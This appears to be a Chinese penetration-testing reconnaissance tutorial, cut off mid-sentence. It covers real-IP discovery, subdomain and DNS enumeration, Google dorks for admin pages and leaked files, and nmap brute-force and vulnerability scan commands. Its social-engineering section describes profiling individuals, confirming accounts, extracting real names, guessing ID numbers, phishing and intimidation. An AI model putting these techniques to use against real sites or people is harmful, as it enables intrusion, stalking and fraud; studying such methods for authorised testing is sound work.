\u6ce8\u610f\uff1a\u8fd9\u4e2a\u7f51\u7ad9\u53ef\u4ee5\u904d\u5386FTP\u3001MX\u8bb0\u5f55\u548c\u5e38\u89c1\u4e8c\u7ea7\u57df\u540d\uff0c\u6709\u4e9b\u7ad9\u957f\u559c\u6b22\u628a\u90ae\u7bb1\u670d\u52a1\u4e5f\u653e\u5728\u81ea\u5df1\u4e3b\u673a\u4e0a\uff0c\u4fa7\u9762\u6cc4\u9732\u4e86\u771f\u5b9e\u7684IP\u5730\u5740\uff0c\u901a\u8fc7\u8fd9\u4e2a\u7f51\u7ad9\u53ef\u4ee5\u8fdb\u884c\u68c0\u67e5\u3002 \u200b 2.\u67e5\u8be2\u5b50\u57df\u540d\uff08\u6377\u5f84\uff0c\u53bb\u4f17\u6d4b\u5e73\u53f0\u3001github\u627e\u5b98\u65b9\u53d1\u5e03\u8fc7\u7684\uff09 \u6ce8\u610f\uff1a\u6709\u53ef\u80fd\u6709\u4e9b\u7ad9\u957f\u53ea\u7ed9\u4e3b\u7ad9\u6216\u6d41\u91cf\u5927\u7684\u5b50\u57df\u540d\u505a\u4e86CDN,\u800c\u5f88\u591a\u5b50\u57df\u540d\u90fd\u662f\u548c\u4e3b\u7ad9\u5728\u540c\u4e00\u53f0\u670d\u52a1\u5668\u4e0a\uff0c\u6216\u8005 C\u6bb5\u4e2d\uff0c\u8fd9\u6837\u53ef\u4ee5\u901a\u8fc7**\u5b50\u57df\u540d\u6765\u8f85\u52a9\u627e\u5230\u7f51\u7ad9\u771f\u5b9eIP** \u7206\u7834\u5b50\u57df\u540d: layer\u5b50\u57df\u540d\u6316\u6398\u673a\uff08\u5b57\u5178\u8981\u81ea\u5df1\u4e30\u5bcc\uff09 http://z.zcjun.com/(\u5728\u7ebf\u5b50\u57df\u540d\u6316\u6398 ) fuzzdomain \u5f88\u597d\u7528\uff0c\u901f\u5ea6\u5feb \u641c\u7d22\u5f15\u64ce\u62ff\u5b50\u57df\u540d\u3001\u65c1\u7ad9\uff08\u540cIP\u7f51\u7ad9\uff09\u3001C\u6bb5\uff1a \u53ef\u7528\u641c\u7d22\u5f15\u64ce\u8bed\u6cd5\u67e5\u8be2\u5b50\u57df\u540d\uff1a \u8c37\u6b4c \u767e\u5ea6 bing \u641c\u72d7(\u641c\u7d22\u5fae\u4fe1\u6587\u7ae0) \u96c5\u864e \u7565\u6709\u5dee\u5f02 \u8be6\u7ec6\u7528\u6cd5: \u200b \uff081\uff09site: =\u4e3b\u57df\u540d,\u641c\u7d22\u5176\u4e3b\u8981\u57df\u540d\u4e0b\u9762\u7684\u5b50\u57df\u540d \u200b \uff082\uff09allintext: = \u641c\u7d22\u6587\u672c,\u4f46\u4e0d\u5305\u62ec\u7f51\u9875\u6807\u9898\u548c\u94fe\u63a5 \u200b \uff083\uff09allinlinks: = \u641c\u7d22\u94fe\u63a5, \u4e0d\u5305\u62ec\u6587\u672c\u548c\u6807\u9898\u3002 \u200b \uff084\uff09related:URL = \u5217\u51fa\u4e8e\u76ee\u6807URL\u5730\u5740\u6709\u5173\u7684\u7f51\u9875\u3002 \u200b \uff085\uff09link:URL = \u5217\u51fa\u5230\u94fe\u63a5\u5230\u76ee\u6807URL\u7684\u7f51\u9875\u6e05\u5355\u3002 \u200b \uff086\uff09\u4f7f\u7528\u201c-\u201d\u53bb\u6389\u4e0d\u60f3\u770b\u7684\u7ed3\u679c\uff0c\u4f8b\u5982site: baidu.com - image.baidu.com \u767e\u5ea6\u8bed\u6cd5\uff1a https://www.cnblogs.com/k0xx/p/12794452.html \u8c37\u6b4c\u8bed\u6cd5\uff1a https://blog.csdn.net/u012991692/article/details/82937100?biz_id=102&utm_term=Googlehack&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-82937100&spm=1018.2118.3001.4187 GHDB\uff1a https://www.exploit-db.com/google-hacking-database 3.\u8d44\u4ea7\u641c\u7d22(\u65c1\u7ad9\\C\u6bb5\\\u7279\u5f81): \u200b https://www.shodan.io (\u5173\u952e\u5b57\u7206ip) \u200b https://fofa.so https://www.zoomeye.org/ \u200b http://www.yunsee.cn/info.html \uff08\u4e91\u6089\u5728\u7ebf\u8d44\u4ea7\u5e73\u53f0) http://subdomain.chaxun.la \uff08\u67e5\u8be2\u5566\uff09 https://www.virustotal.com/gui/home/search https://dnsdumpster.com/ https://duckduckgo.com \uff08\u4e00\u4e2a\u4e0d\u4f1a\u5b58\u50a8\u4f60\u4e2a\u4eba\u4fe1\u606f\u7684\u641c\u7d22\u5f15\u64ce\uff09 https://crt.sh/ \uff08SSL\u8bc1\u4e66\u67e5\u8be2\uff09 https://icp.aizhan.com/(\u57df\u540d\u5907\u6848 ) 4.\u5bf9\u65b9\u670d\u52a1\u5668\u7ed9\u81ea\u5df1\u53d1\u90ae\u4ef6\u66b4\u9732IP 5.APP\u5ba2\u6237\u7aef\u7206ip 1.2 DNS\u4fe1\u606f\u67e5\u8be2 \u00b6 \u76ee\u7684: \u6ce8\u518c\u8005\u540d\u79f0\u53ca\u90ae\u7bb1,\u518d\u53cd\u67e5\u5176\u4ed6\u57df\u540d \u624b\u673a\u53f7 \u5ea7\u673a\u53f7 ASN\u53f7 \u5730\u5740 \u5728\u7ebfDNS\u4fe1\u606f\u67e5\u8be2\u5de5\u5177 \u00b6 https://dnsdumpster.com/ https://www.dnsdb.io \uff08DNS\u641c\u7d22\u5f15\u64ce\uff09 http://searchdns.netcraft.com http://whois.nawang.cn/ https://whois.aliyun.com/ https://whois.west.cn/ http://whois.chinaz.com/ (\u7ad9\u957f\u4e4b\u5bb6) https://www.tianyancha.com/ \uff08\u5929\u773c\u67e5\uff09 http://www.gsxt.gov.cn/index.html \uff08\u56fd\u5bb6\u4f01\u4e1a\u4fe1\u7528\u4fe1\u606f\u7cfb\u7edf\uff09 www.beianbeian.com/ \uff08ICP\u5907\u6848\u67e5\u8be2\uff09 1.3 \u6d4b\u8bd5\u57df\u4f20\u9001\u6f0f\u6d1e \u00b6 \u57df\u4f20\u9001\u662f\u4e00\u79cdDNS\u4e8b\u52a1\uff0c\u7528\u4e8e\u5728\u4e3b\u4ece\u670d\u52a1\u5668\u95f4\u590d\u5236DNS\u8bb0\u5f55\u3002\u867d\u7136\u5982\u4eca\u5df2\u7ecf\u5f88\u5c11\u89c1\u4e3b\u673a\u4f1a\u5f00\u542f\uff0c\u4f46\u662f\u8fd8\u662f\u5e94\u8be5\u786e\u8ba4\u4e00\u4e0b\u3002\u4e00\u65e6\u5b58\u5728\u57df\u4f20\u9001\u6f0f\u6d1e\uff0c\u5c31\u610f\u5473\u7740\u4f60\u83b7\u53d6\u4e86\u6574\u4e2a\u57df\u4e0b\u9762\u6240\u6709\u7684\u8bb0\u5f55\u3002 dnsrecon -d example.com dnsenum example.com \u5305\u542b\u81ea\u52a8\u68c0\u6d4b\u57df\u4f20\u9001\u6f0f\u6d1e 1.4 \u4e1a\u52a1\u76f8\u5173 \u00b6 github\u6cc4\u9732\uff1a in:name test #\u4ed3\u5e93\u6807\u9898\u641c\u7d22\u542b\u6709\u5173\u952e\u5b57 SpringCloud in:descripton test #\u4ed3\u5e93\u63cf\u8ff0\u641c\u7d22\u542b\u6709\u5173\u952e\u5b57 in:readme test #Readme\u6587\u4ef6\u641c\u7d20\u542b\u6709\u5173\u952e\u5b57 stars:>3000 test #stars\u6570\u91cf\u5927\u4e8e3000\u7684\u641c\u7d22\u5173\u952e\u5b57 stars:1000..3000 test #stars\u6570\u91cf\u5927\u4e8e1000\u5c0f\u4e8e3000\u7684\u641c\u7d22\u5173\u952e\u5b57 forks:>1000 test #forks\u6570\u91cf\u5927\u4e8e1000\u7684\u641c\u7d22\u5173\u952e\u5b57 forks:1000..3000 test #forks\u6570\u91cf\u5927\u4e8e1000\u5c0f\u4e8e3000\u7684\u641c\u7d22\u5173\u952e\u5b57 size:>=5000 test #\u6307\u5b9a\u4ed3\u5e93\u5927\u4e8e5000k(5M)\u7684\u641c\u7d22\u5173\u952e\u5b57 pushed:>2019-02-12 test #\u53d1\u5e03\u65f6\u95f4\u5927\u4e8e2019-02-12\u7684\u641c\u7d22\u5173\u952e\u5b57 created:>2019-02-12 test #\u521b\u5efa\u65f6\u95f4\u5927\u4e8e2019-02-12\u7684\u641c\u7d22\u5173\u952e\u5b57 user:test #\u7528\u6237\u540d\u641c\u7d20 license:apache-2.0 test #\u660e\u786e\u4ed3\u5e93\u7684 LICENSE \u641c\u7d22\u5173\u952e\u5b57 language:java test #\u5728java\u8bed\u8a00\u7684\u4ee3\u7801\u4e2d\u641c\u7d22\u5173\u952e\u5b57 user:test in:name test #\u7ec4\u5408\u641c\u7d22,\u7528\u6237\u540dtest\u7684\u6807\u9898\u542b\u6709test\u7684 \u7f51\u76d8\u6cc4\u9732\uff1a \u5404\u79cd\u4e91\u7f51\u76d8\uff0c\u8be6\u89c1\u866b\u90e8\u843d\u641c\u7d22: magnet.chongbuluo.com \u654f\u611f\u8def\u5f84\u626b\u63cf\uff1a https://github.com/ring04h/weakfilescan 2. OSINT \u516c\u5f00\u60c5\u62a5\u6536\u96c6 \u00b6 2.1\u793e\u4f1a\u5de5\u7a0b\u5b66\u6280\u5de7( \u7f51\u7edc\u5b89\u5168\u653b\u9632\uff1a\u793e\u4f1a\u5de5\u7a0b\u5b66\u4e4b\u6982\u8ff0 ) \u00b6 \u67e5\u770b\u6ce8\u518c\u7684\u7f51\u7ad9\uff1a0xreg reg007 \u77e5\u9053\u8d26\u53f7\u53bb\u5df2\u6ce8\u518c\u7684\u7f51\u7ad9\u627e\u56de\u5bc6\u7801\uff0c\u53ef\u4ee5\u770b\u5230\u6253\u7801\u540e\u7684\u7528\u6237\u540d\u3001\u90ae\u7bb1\u3001\u771f\u5b9e\u59d3\u540d\u7b49\u4fe1\u606f\uff0c\u5982\u679c\u8fd0\u6c14\u597d\u6ca1\u51c6\u80fd\u4ece\u6570\u636e\u5305\u6216html\u4e2d\u627e\u5230\u672a\u88ab\u6253\u7801\u7684\u4fe1\u606f \u53ef\u4ee5\u4ece\u8fd9\u4e9b\u65b9\u9762\u5224\u65ad\u7528\u6237\u662f\u5426\u6ce8\u518c\u8fc7 \u627e\u56de\u5bc6\u7801 \u8f93\u5165\u8d26\u53f7\uff0c\u5982\u679c\u8fdb\u5165\u4e0b\u4e00\u6b65\u4e86\u5219\u8be5\u8d26\u53f7\u5b58\u5728 \u767b\u5f55 \u8f93\u5165\u8d26\u53f7\u548c\u5bc6\u7801\uff0c\u5982\u679c\u63d0\u793a\u5bc6\u7801\u9519\u8bef\uff0c\u5219\u8868\u793a\u8be5\u7528\u6237\u5df2\u5b58\u5728 \u6ce8\u518c \u586b\u5199\u8d26\u53f7\u65f6\u4e00\u822c\u7f51\u7ad9\u4f1a\u53bb\u68c0\u6d4b\u8be5\u8d26\u53f7\u662f\u5426\u5df2\u5b58\u5728\uff0c\u5982\u679c\u5df2\u5b58\u5728\u5219\u4f1a\u63d0\u793a\u4e0d\u53ef\u91cd\u590d\u6ce8\u518c \u77e5\u9053QQ \u901a\u8fc7QQ\u90ae\u7bb1\u548cQQ\u53f7\u641c\u7d22\u652f\u4ed8\u5b9d\u3001\u6dd8\u5b9d\u8d26\u53f7\u7b49\u5176\u4ed6\u53ef\u80fd\u7684\u5e38\u7528\u5e73\u53f0 \u53bb\u817e\u8baf\\\u65b0\u6d6a\u5fae\u535a\u641c\u7d22 \u901a\u8fc7\u5fae\u4fe1\u641c\u7d22 \u67e5\u770bQQ\u7a7a\u95f4\\\u76f8\u518c\\\u5730\u533a\\\u661f\u5ea7\\\u751f\u65e5\\\u6635\u79f0(\u540e\u7eed\u6784\u5efa\u5b57\u5178\u4ee5\u53ca\u8de8\u5e73\u53f0\u641c\u96c6) \u901a\u8fc7\u8bf4\u8bf4\u3001\u7559\u8a00\u3001\u65e5\u5fd7\u627e\u5230\u5176\u597d\u53cb \u52a0QQ\u9493\u9c7c\\\u5171\u540c\u597d\u53cb\\\u53ef\u80fd\u8ba4\u8bc6\u7684\u4eba \u77e5\u9053\u624b\u673a\u53f7 \u641c\u7d22QQ\u3001\u5fae\u4fe1\u3001\u9489\u9489\u7b49\u793e\u4ea4\u8d26\u53f7 \u5728\u6bd4\u8f83\u706b\u7684\u4e00\u4e9bAPP\u548c\u7f51\u7ad9\u4e0a\u6ce8\u518c\u6216\u5fd8\u8bb0\u5bc6\u7801\u6765\u5224\u65ad\u662f\u5426\u6ce8\u518c\u8fc7\u8d26\u53f7 \u67e5\u8be2\u652f\u4ed8\u5b9d\u8d26\u53f7\uff0c\u5c1d\u8bd5\u8f93\u5165\u5e38\u89c1\u59d3\u6c0f\u83b7\u53d6\u540d\u5b57(\u8f6c\u8d26\u5230\u8be5\u624b\u673a\u53f7,\u4f1a\u63d0\u793a\u8f93\u5165\u59d3\u6c0f\u9a8c\u8bc1) \u901a\u8fc7\u5bf9\u65b9\u7684\u804c\u4e1a\u3001\u5174\u8da3\u627e\u5230\u8be5\u9886\u57df\u77e5\u540d\u5ea6\u8f83\u9ad8\u7684\u793e\u4ea4\u7f51\u7ad9\u53cd\u67e5 \u6839\u636e\u5728QQ\u7a7a\u95f4\u3001\u670b\u53cb\u5708\u7b49\u52a8\u6001\u7528\u767e\u5ea6\u8bc6\u56fe\u8bc6\u522b\u7167\u7247 \u5728\u5fae\u535a\u3001ins\u3001Twitter\u3001fb\u3001\u767e\u5ea6\u8d34\u5427\u641c\u7d22\u76f8\u8fd1\u5173\u952e\u5b57\uff0c\u6309\u5730\u57df\u3001\u5e74\u9f84\u3001\u7537\u5973\u3001\u7528\u6237\u540d\u7b49\u7b5b\u9009 \u7559\u610f\u793e\u4ea4\u52a8\u6001 \u53d1\u5e03\u65f6\u95f4\u7ebf \u4f7f\u7528\u4ec0\u4e48\u5ba2\u6237\u7aef iPhone Android\u8fd8\u662f\u6d4f\u89c8\u5668 \u9488\u5bf9\u5ba2\u6237\u7aef\u9884\u5148\u5236\u5b9aexploit \u200b \u6ce8\u610f\u6bcf\u4e00\u6761\u94fe\u63a5 / \u56fe\u7247 / \u89c6\u9891 \u94fe\u63a5\u53ef\u80fd\u5305\u542b\u7528\u6237ID \u56fe\u7247\u53ef\u80fd\u5305\u542b\u6c34\u5370\uff0cexif\u53ef\u80fd\u4f1a\u6709GPS\u5b9a\u4f4d\u548c\u624b\u673a\u7c7b\u578b,\u56fe\u7247\u5185\u5bb9\u7279\u5f81 \u89c6\u9891\u4e5f\u6709\u53ef\u80fd\u6709\u6c34\u5370\u66b4\u9732\u793e\u4ea4\u8d26\u53f7ID,\u62cd\u6444\u5730\u70b9 \u4ece\u6700\u65e9\u53d1\u5e03\u7684\u52a8\u6001\u770b\u8d77\uff0c\u4f1a\u6709\u5f88\u5927\u6536\u83b7 \u4e00\u822c\u5f97\u5230\u4e00\u4e2a\u8d26\u53f7\u7684\u5bc6\u7801\u5c31\u76f8\u5f53\u4e8e\u5f97\u5230\u4e86\u5176\u4ed6\u8d26\u53f7\u7684\u5bc6\u7801 \u4e00\u822c\u4eba\u4e0d\u540c\u8d26\u53f7\u7684\u7528\u6237\u540d\u90fd\u662f\u76f8\u540c\u6216\u76f8\u8fd1\u7684 \u4e00\u822c\u4eba\u7684\u793e\u4ea4\u8d26\u53f7\u5934\u50cf\u7528\u7684\u90fd\u662f\u4e00\u6837\u7684 \u5c1d\u8bd5\u7834\u89e3\u793e\u4fdd\u3001\u516c\u79ef\u91d1\u8d26\u53f7\u3001\u8eab\u4efd\u8bc1\u53f7\uff08\u51fa\u751f\u5730\u3001\u751f\u65e5\u3001\u661f\u5ea7\u3001\u6d3e\u51fa\u6240\u4ee3\u7801\uff09 \u866b\u90e8\u843d\u5feb\u641c\u4e4b\u6587\u4ef6\u641c\u7d22: https://search.chongbuluo.com/ qq\u7fa4\u3001\u7fa4\u6587\u4ef6\u3001\u8d34\u5427\u8bba\u575b\u3001\u76ee\u6807\u81ea\u7528\u8bba\u575b\u7b49\u793e\u4ea4\u5e73\u53f0\u9493\u9c7c\u548c\u4fe1\u606f\u6cc4\u9732(\u722c\u90ae\u7bb1\u7b49\u4fe1\u606f) \u7535\u5b50\u90ae\u4ef6\u4f2a\u9020\u3001\u7f51\u7edc\u9493\u9c7c \u4e0b\u8f7d\u6076\u610f\u7a0b\u5e8f \u8f93\u5165\u654f\u611f\u4fe1\u606f \u5927\u90e8\u5206\u4fe1\u606f\u53ef\u4ee5\u7528\u6765\u751f\u6210\u5bc6\u7801\u5b57\u5178 \u5bf9\u4eba\uff1a\u8bf4\u670d\u5bf9\u65b9\u8fbe\u6210\u4e00\u81f4\u3001\u6050\u5413\u5bf9\u65b9\uff08\u654f\u611f\u8bcd\u3001\u6f0f\u6d1e\u3001\u75c5\u6bd2\u3001\u6743\u5a01\u673a\u6784\u540d\u79f0\u3001\uff09\uff0c\u9493\u9c7c\u83b7\u53d6\u4fe1\u606f 2.2\u641c\u7d22\u5f15\u64ceOSINT \u00b6 Google Hacking(baidu\\bing\\souhu\\github) \u00b6 **GoogleHacking**\u5e38\u7528\u8bed\u6cd5 1\u3001intext\uff1a\uff08\u4ec5\u9488\u5bf9Google\u6709\u6548\uff09 \u628a\u7f51\u9875\u4e2d\u7684\u6b63\u6587\u5185\u5bb9\u4e2d\u7684\u67d0\u4e2a\u5b57\u7b26\u4f5c\u4e3a\u641c\u7d22\u7684\u6761\u4ef6 2\u3001intitle\uff1a \u628a\u7f51\u9875\u6807\u9898\u4e2d\u7684\u67d0\u4e2a\u5b57\u7b26\u4f5c\u4e3a\u641c\u7d22\u7684\u6761\u4ef6 3\u3001cache\uff1a \u641c\u7d22\u641c\u7d22\u5f15\u64ce\u91cc\u5173\u4e8e\u67d0\u4e9b\u5185\u5bb9\u7684\u7f13\u5b58\uff0c\u53ef\u80fd\u4f1a\u5728\u8fc7\u671f\u5185\u5bb9\u4e2d\u53d1\u73b0\u6709\u4ef7\u503c\u7684\u4fe1\u606f 4\u3001filetype/ext\uff1a \u6307\u5b9a\u4e00\u4e2a\u683c\u5f0f\u7c7b\u578b\u7684\u6587\u4ef6\u4f5c\u4e3a\u641c\u7d22\u5bf9\u8c61 5\u3001inurl\uff1a \u641c\u7d22\u5305\u542b\u6307\u5b9a\u5b57\u7b26\u7684URL 6\u3001site\uff1a \u5728\u6307\u5b9a\u7684(\u57df\u540d)\u7ad9\u70b9\u641c\u7d22\u76f8\u5173\u5185\u5bb9 GoogleHacking\u5176\u4ed6\u8bed\u6cd5 1\u3001\u5f15\u53f7 \u201d \u201d \u628a\u5173\u952e\u5b57\u6253\u4e0a\u5f15\u53f7\u540e\uff0c\u628a\u5f15\u53f7\u90e8\u5206\u4f5c\u4e3a\u6574\u4f53\u6765\u641c\u7d22 2\u3001or \u540c\u65f6\u641c\u7d22\u4e24\u4e2a\u6216\u66f4\u591a\u7684\u5173\u952e\u5b57 3\u3001link \u641c\u7d22\u67d0\u4e2a\u7f51\u7ad9\u7684\u94fe\u63a5 link: baidu.com \u5373\u8fd4\u56de\u6240\u6709\u548cbaidu\u505a\u4e86\u94fe\u63a5\u7684URL 4\u3001info \u67e5\u627e\u6307\u5b9a\u7ad9\u70b9\u7684\u4e00\u4e9b\u57fa\u672c\u4fe1\u606f **GoogleHackingDatabase: google-hacking-database GoogleHacking\u5178\u578b\u7528\u6cd5(\u7279\u5b9a\u8d44\u4ea7\u7684\u4e07\u80fd\u5bc6\u7801\u4e5f\u8981\u79ef\u7d2f) \u7ba1\u7406\u540e\u53f0\u5730\u5740 site: target.com intext:\u7ba1\u7406 | \u540e\u53f0 | \u540e\u53f0\u7ba1\u7406 | \u767b\u9646 | \u767b\u5f55 | \u7528\u6237\u540d | \u5bc6\u7801 | \u7cfb\u7edf | \u8d26\u53f7 | login | system site: target.com inurl:login | inurl:admin | inurl:manage | inurl:manager | inurl:admin_login | inurl:system | inurl:backend site: target.com intitle:\u7ba1\u7406 | \u540e\u53f0 | \u540e\u53f0\u7ba1\u7406 | \u767b\u9646 | \u767b\u5f55 \u4e0a\u4f20\u7c7b\u6f0f\u6d1e\u5730\u5740 site: target.com inurl:file site: target.com inurl:upload \u6ce8\u5165\u9875\u9762 site: target.com inurl:php?id= \u7f16\u8f91\u5668\u9875\u9762 site: target.com inurl:ewebeditor \u76ee\u5f55\u904d\u5386\u6f0f\u6d1e site: target.com intitle:index.of SQL\u9519\u8bef site: target.com intext:\"sql syntax near\" | intext:\"syntax error has occurred\" | intext:\"incorrect syntax near\" | intext:\"unexpected end of SQL command\" | intext:\"Warning: mysql_connect()\" | intext:\u201dWarning: mysql_query()\" | intext:\u201dWarning: pg_connect()\" phpinfo() site: target.com ext:php intitle:phpinfo \"published by the PHP Group\" \u914d\u7f6e\u6587\u4ef6\u6cc4\u9732 site: target.com ext:.xml | .conf | .cnf | .reg | .inf | .rdp | .cfg | .txt | .ora | .ini \u6570\u636e\u5e93\u6587\u4ef6\u6cc4\u9732 site: target.com ext:.sql | .dbf | .mdb | .db \u65e5\u5fd7\u6587\u4ef6\u6cc4\u9732 site: target.com ext:.log \u5907\u4efd\u548c\u5386\u53f2\u6587\u4ef6\u6cc4\u9732 site: target.com ext:.bkf | .bkp | .old | .backup | .bak | .swp | .rar | .txt | .zip | .7z | .sql | .tar.gz | .tgz | .tar \u516c\u5f00\u6587\u4ef6\u6cc4\u9732 site: target.com filetype:.doc | .docx | .xls | .xlsx | .ppt | .pptx | .odt | .pdf | .rtf | .sxw | .psw | .csv \u90ae\u7bb1\u4fe1\u606f site: target.com intext:@ target.com site: target.com \u90ae\u4ef6 site: target.com email \u793e\u5de5\u4fe1\u606f site: target.com intitle:\u8d26\u53f7 | \u5bc6\u7801 | \u5de5\u53f7 | \u5b66\u53f7 | \u8eab\u4efd\u8bc1 2.3\u6d4f\u89c8\u5668\u5b9e\u7528\u63d2\u4ef6\uff1a \u00b6 Wappalyzer\uff1a\u8bc6\u522b\u7f51\u7ad9\u4f7f\u7528\u7684\u4e2d\u95f4\u4ef6\u53ca\u5176\u7248\u672c\uff0c\u518d\u53bb\u6f0f\u6d1e\u5e93\u548c\u641c\u7d22\u5f15\u64ce\u627e\u516c\u5f00\u62ab\u9732\u7684\u6f0f\u6d1e SwitchOmega\uff1a\u5feb\u6377\u5207\u6362\u4ee3\u7406 shodan\uff1a\u8bc6\u522b\u5f00\u653e\u7aef\u53e3\uff0c\u4e3b\u673a\u670d\u52a1\u7b49 hacktools:\u7efc\u5408\u63d2\u4ef6,\u5f88\u5f3a\u5927 firefox\u6e17\u900f\u4fbf\u643a\u7248,\u5de5\u5177\u96c6\u6210\u5f88\u591a \u6ce8\u610f\uff1a\u6839\u636e\u83b7\u5f97\u670d\u52a1\u3001\u4e2d\u95f4\u4ef6\u4fe1\u606f\u3001\u7f16\u8f91\u5668\u7248\u672c\u3001\u6570\u636e\u5e93\u7b49OSINT\u53bb\u5404\u5927\u6f0f\u6d1e\u5e93\u3001\u641c\u7d22\u5f15\u64ce\u627e\u6f0f\u6d1e\u5229\u7528 2.4\u4e4c\u4e91\u548ccnvd \u00b6 \u4e4c\u4e91\u5e93\\\u4e4c\u4e91\u955c\u50cf\\GHDB\\CNVD\u7b49\u516c\u5f00\u6f0f\u6d1e\u5e93 0x02 Mapping \u00b6 \u5728\u4e00\u6b21\u6e17\u900f\u6d4b\u8bd5\u8fc7\u7a0b\u4e2d\uff0cMapping\u7684\u76ee\u7684\u662f\u7ad9\u5728\u4e00\u4e2a\u666e\u901a\u7528\u6237\u7684\u89d2\u5ea6\u53bb\u4e86\u89e3\u6574\u4e2a\u5e94\u7528\u7684\u5168\u8c8c\u3002 1.\u4e3b\u52a8\u626b\u63cf \u00b6 1.1\u5e38\u89c1\u670d\u52a1\u6f0f\u6d1e: \u00b6 nmap\u7684\u4f7f\u7528: \u811a\u672c\u626b\u63cf\uff0c\u9690\u853d\u626b\u63cf\uff0c\u7aef\u53e3\u626b\u63cf\uff0c\u670d\u52a1\u8bc6\u522b\uff0cOS\u8bc6\u522b\uff0c\u63a2\u6d4bWAF nmap\u811a\u672c\u4e3b\u8981\u5206\u4e3a\u4ee5\u4e0b\u51e0\u7c7b\uff0c\u5728\u626b\u63cf\u65f6\u53ef\u6839\u636e\u9700\u8981\u8bbe\u7f6e\u2013script=\u7c7b\u522b\u8fd9\u79cd\u65b9\u5f0f\u8fdb\u884c\u6bd4\u8f83\u7b3c\u7edf\u7684\u626b\u63cf\uff1a auth: \u8d1f\u8d23\u5904\u7406\u9274\u6743\u8bc1\u4e66\uff08\u7ed5\u5f00\u9274\u6743\uff09\u7684\u811a\u672c broadcast: \u5728\u5c40\u57df\u7f51\u5185\u63a2\u67e5\u66f4\u591a\u670d\u52a1\u5f00\u542f\u72b6\u51b5\uff0c\u5982dhcp/dns/sqlserver\u7b49\u670d\u52a1 brute: \u63d0\u4f9b\u66b4\u529b\u7834\u89e3\u65b9\u5f0f\uff0c\u9488\u5bf9\u5e38\u89c1\u7684\u5e94\u7528\u5982http/snmp\u7b49 default: \u4f7f\u7528-sC\u6216-A\u9009\u9879\u626b\u63cf\u65f6\u5019\u9ed8\u8ba4\u7684\u811a\u672c\uff0c\u63d0\u4f9b\u57fa\u672c\u811a\u672c\u626b\u63cf\u80fd\u529b discovery: \u5bf9\u7f51\u7edc\u8fdb\u884c\u66f4\u591a\u7684\u4fe1\u606f\uff0c\u5982SMB\u679a\u4e3e\u3001SNMP\u67e5\u8be2\u7b49 dos: \u7528\u4e8e\u8fdb\u884c\u62d2\u7edd\u670d\u52a1\u653b\u51fb exploit: \u5229\u7528\u5df2\u77e5\u7684\u6f0f\u6d1e\u5165\u4fb5\u7cfb\u7edf external: \u5229\u7528\u7b2c\u4e09\u65b9\u7684\u6570\u636e\u5e93\u6216\u8d44\u6e90\uff0c\u4f8b\u5982\u8fdb\u884cwhois\u89e3\u6790 fuzzer: \u6a21\u7cca\u6d4b\u8bd5\u7684\u811a\u672c\uff0c\u53d1\u9001\u5f02\u5e38\u7684\u5305\u5230\u76ee\u6807\u673a\uff0c\u63a2\u6d4b\u51fa\u6f5c\u5728\u6f0f\u6d1e intrusive: \u5165\u4fb5\u6027\u7684\u811a\u672c\uff0c\u6b64\u7c7b\u811a\u672c\u53ef\u80fd\u5f15\u53d1\u5bf9\u65b9\u7684IDS/IPS\u7684\u8bb0\u5f55\u6216\u5c4f\u853d malware: \u63a2\u6d4b\u76ee\u6807\u673a\u662f\u5426\u611f\u67d3\u4e86\u75c5\u6bd2\u3001\u5f00\u542f\u4e86\u540e\u95e8\u7b49\u4fe1\u606f safe: \u6b64\u7c7b\u4e0eintrusive\u76f8\u53cd\uff0c\u5c5e\u4e8e\u5b89\u5168\u6027\u811a\u672c version: \u8d1f\u8d23\u589e\u5f3a\u670d\u52a1\u4e0e\u7248\u672c\u626b\u63cf\uff08Version Detection\uff09\u529f\u80fd\u7684\u811a\u672c vuln: \u8d1f\u8d23\u68c0\u67e5\u76ee\u6807\u673a\u662f\u5426\u6709\u5e38\u89c1\u7684\u6f0f\u6d1e\uff08Vulnerability\uff09\uff0c\u5982\u662f\u5426\u6709MS08_067 \uff081\uff09 nmap --script=auth 192.168.137.* \u8d1f\u8d23\u5904\u7406\u9274\u6743\u8bc1\u4e66\uff08\u7ed5\u5f00\u9274\u6743\uff09\u7684\u811a\u672c,\u4e5f\u53ef\u4ee5\u4f5c\u4e3a\u68c0\u6d4b\u90e8\u5206\u5e94\u7528\u5f31\u53e3\u4ee4 \uff082\uff09nmap --script=brute 192.168.137.* \u63d0\u4f9b\u66b4\u529b\u7834\u89e3\u7684\u65b9\u5f0f \u53ef\u5bf9\u6570\u636e\u5e93\uff0csmb\uff0csnmp\u7b49\u8fdb\u884c\u7b80\u5355\u5bc6\u7801\u7684\u66b4\u529b\u731c\u89e3 \uff083\uff09nmap --script=default 192.168.137.* \u6216\u8005 nmap -sC 192.168.137.* \u9ed8\u8ba4\u7684\u811a\u672c\u626b\u63cf\uff0c\u4e3b\u8981\u662f\u641c\u96c6\u5404\u79cd\u5e94\u7528\u670d\u52a1\u7684\u4fe1\u606f\uff0c\u6536\u96c6\u5230\u540e\uff0c\u53ef\u518d\u9488\u5bf9\u5177\u4f53\u670d\u52a1\u8fdb\u884c\u653b\u51fb \uff084\uff09nmap --script=vuln 192.168.137.* \u68c0\u67e5\u662f\u5426\u5b58\u5728\u5e38\u89c1\u6f0f\u6d1e \uff085\uff09nmap -n -p445 --script=broadcast 192.168.137.4 \u5728\u5c40\u57df\u7f51\u5185\u63a2\u67e5\u66f4\u591a\u670d\u52a1\u5f00\u542f\u72b6\u51b5 \uff086\uff09nmap --script external 202.103.243.110 \u5229\u7528\u7b2c\u4e09\u65b9\u7684\u6570\u636e\u5e93\u6216\u8d44\u6e90\uff0c\u4f8b\u5982\u8fdb\u884cwhois\u89e3\u6790 nmap --script banner ip nmap -p port -sV ip \u83b7\u53d6\u8f6f\u4ef6\u7248\u672c\u4fe1\u606f nmap -O ip \u64cd\u4f5c\u7cfb\u7edf\u4fe1\u606f\uff0c\u7248\u672c nmap -A -v ip \u5b8c\u6574\u4fe1\u606f\u83b7\u53d6 -sN;-sF;-sX \u9690\u853d\u626b\u63cf -sN\u662fNull\u626b\u63cf,\u662f\u901a\u8fc7\u53d1\u9001\u975e\u5e38\u89c4\u7684TCP\u901a\u4fe1\u6570\u636e\u5305\u5bf9\u8ba1\u7b97\u673a\u8fdb\u884c\u63a2\u6d4b. nmap -sN 127.0.0.1 -sF\u662fFIN\u626b\u63cf,\u5f53\u6211\u4eec\u4f7f\u7528TCP 